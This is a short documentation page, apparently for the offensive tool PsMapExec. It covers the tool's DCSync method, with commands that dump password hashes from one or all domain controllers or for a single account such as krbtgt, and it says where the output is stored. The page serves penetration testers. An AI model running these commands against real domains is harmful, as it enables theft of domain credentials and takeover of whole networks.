# DCSync

Performs DCSync against specified domain controllers. Output for each system is stored in $pwd\PME\DCSync\DCSync_Full_Dump unless a specific user is targeted in which case data is stored in $pwd\PME\DCSync\DCSync_User_Dump

### Target a specific DC

    PsMapExec -Method dcsync -Targets DC01.security.local -ShowOutput

### Target all DCs (Syncs all so very noisy)

    PsMapExec -Method dcsync -Targets DC -ShowOutput

It is also possible to only sync a single user. It is highly recommended to ensure when doing so, to append the domain netbios name to the username.

    PsMapExec -Method dcsync -Targets DC01 -option "dcsync:security\krbtgt" -ShowOutput
